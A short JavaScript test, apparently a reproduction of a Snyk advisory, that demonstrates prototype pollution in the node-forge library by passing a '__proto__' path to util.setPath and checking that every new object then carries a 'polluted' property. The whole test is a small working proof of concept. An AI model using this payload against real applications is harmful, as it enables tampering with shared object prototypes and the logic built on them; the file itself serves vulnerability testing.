//https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-609293
test("prototype pollution in node-forge", () => {
  expect({}.polluted).toBe(undefined);

  const nodeforge = require("node-forge");
  const obj = {};
  nodeforge.util.setPath(obj, ["__proto__", "polluted"], "yes");

  expect({}.polluted).toBe("yes");
});
